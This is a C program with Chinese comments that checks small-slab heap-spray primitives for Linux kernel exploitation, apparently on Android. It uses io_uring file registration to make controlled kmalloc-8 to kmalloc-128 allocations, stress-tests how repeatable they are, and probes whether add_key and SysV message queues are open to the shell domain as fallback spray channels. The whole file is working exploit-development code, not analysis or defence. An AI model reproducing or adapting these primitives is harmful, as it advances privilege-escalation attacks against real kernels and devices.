/* iur_small.c — 小类(kmalloc-8/16/32/64/128)堆喷射原语验证
 * 主原语: io_uring IORING_REGISTER_FILES → kvmalloc(nr * sizeof(file*)) = nr*8 字节
 *         持有直到 UNREGISTER_FILES ⇒ 批量 alloc/free, 可重复
 *         nr=1→8B  nr=2→16B  nr=4→32B  nr=8→64B  nr=16→128B
 * 备选原语可用性: add_key / SysV msgqueue (测 SELinux 是否放行 shell 域)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>

#define IORING_REGISTER_FILES    2
#define IORING_UNREGISTER_FILES  3

static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_register(unsigned fd, unsigned op, void*a, unsigned n){ return syscall(427, fd, op, a, n); }

int main(void){
    /* ---- 主原语: REGISTER_FILES ---- */
    struct { int _; } _d;
    long fd = sys_setup(4, &(struct { uint64_t x[30]; }){0});
    printf("setup fd=%ld errno=%d\n", fd, errno);
    if (fd < 0) return 1;

    int keep = open("/dev/zero", O_RDONLY);
    printf("keep fd=%d\n", keep);

    unsigned sizes[] = {1,2,4,8,16,32};
    for (unsigned s = 0; s < sizeof(sizes)/sizeof(sizes[0]); s++){
        unsigned nr = sizes[s];
        int tmp[64];
        for (unsigned i=0;i<nr;i++) tmp[i] = dup(keep);
        long r = sys_register((unsigned)fd, IORING_REGISTER_FILES, tmp, nr);
        printf("REGISTER_FILES(nr=%u → kvmalloc %uB → kmalloc-%u) = %ld errno=%d\n",
               nr, nr*8, nr*8<=8?8: nr*8<=16?16: nr*8<=32?32: nr*8<=64?64: nr*8<=128?128:256, r, errno);
        if (r == 0){
            /* 持有一小段时间, 再释放 */
            usleep(50000);
            long r2 = sys_register((unsigned)fd, IORING_UNREGISTER_FILES, NULL, 0);
            printf("  UNREGISTER_FILES = %ld errno=%d\n", r2, errno);
        }
        for (unsigned i=0;i<nr;i++) close(tmp[i]);
    }

    /* ---- 可重复性压力: 200 次 register/unregister 循环 (kmalloc-16) ---- */
    int tmp[2] = { dup(keep), dup(keep) };
    int ok = 0;
    for (int i=0;i<200;i++){
        if (sys_register((unsigned)fd, IORING_REGISTER_FILES, tmp, 2) == 0 &&
            sys_register((unsigned)fd, IORING_UNREGISTER_FILES, NULL, 0) == 0) ok++;
    }
    printf("stress register/unregister x200 (kmalloc-16): 成功 %d/200\n", ok);
    close(tmp[0]); close(tmp[1]);

    /* ---- 备选原语可用性 ---- */
#ifdef SYS_add_key
    {
        long k = syscall(SYS_add_key, "user", "iur_spray_probe", "AAAAAAAAAAAAAAAA", 16, -2 /*PROCESS_KEYRING*/);
        printf("add_key(16B payload) = %ld errno=%d %s\n", k, errno,
               k>=0 ? "(可用)" : "(被拒)");
    }
#else
    printf("SYS_add_key 未定义\n");
#endif
    {
        int q = msgget(IPC_PRIVATE, IPC_CREAT|0600);
        if (q >= 0){
            struct { long mtype; char text[16]; } m = {1, "AAAAAAAAAAAAAAAA"};
            int r = (int)msgsnd(q, &m, 16, IPC_NOWAIT);
            printf("msgget=%d msgsnd(16B→kmalloc-64)=%d errno=%d %s\n", q, r, errno,
                   r==0 ? "(可用)" : "(被拒)");
            if (r==0){ struct { long mtype; char text[16]; } g; msgrcv(q, &g, 16, 0, IPC_NOWAIT); }
            msgctl(q, IPC_RMID, NULL);
        } else printf("msgget 失败 errno=%d (被拒)\n", errno);
    }
    printf("=== 小类喷射原语验证完毕 ===\n");
    return 0;
}
